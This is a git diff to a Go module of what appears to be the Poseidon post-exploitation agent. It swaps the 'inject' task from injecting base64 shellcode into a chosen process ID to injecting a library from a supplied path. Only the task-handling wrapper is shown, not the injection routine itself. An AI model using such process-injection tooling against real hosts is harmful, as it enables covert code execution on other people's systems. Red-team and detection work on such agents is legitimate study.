@@ -1,13 +1,13 @@
 package inject
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
+// Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
 type Injection interface {
 	TargetPid() int
 	Shellcode() []byte
@@ -16,9 +16,8 @@ type Injection interface {
 }
 
 type Arguments struct {
-	PID              int    `json:"pid"`
-	EncodedShellcode string `json:"shellcode"`
-	LibraryPath      string `json:"library"`
+	PID         int    `json:"pid"`
+	LibraryPath string `json:"library"`
 }
 
 func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
@@ -35,7 +34,14 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		return
 	}
 
-	raw, err := base64.StdEncoding.DecodeString(args.EncodedShellcode)
+	if err != nil {
+		tMsg.Error = true
+		tMsg.TaskResult = []byte(err.Error())
+		threadChannel <- tMsg
+		return
+	}
+
+	result, err := injectLibrary(args.PID, args.LibraryPath)
 
 	if err != nil {
 		tMsg.Error = true
@@ -44,15 +50,6 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		return
 	}
 
-	success, err := injectShellcode(args.PID, raw)
-
-	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
-		return
-	}
-
-	tMsg.TaskResult = []byte(fmt.Sprintf("Code injection into pid: %d returned result: %s", args.PID, success.Success()))
+	tMsg.TaskResult = []byte(fmt.Sprintf("Code injection into pid: %d returned result: %s", args.PID, result.Success()))
 	threadChannel <- tMsg
 }
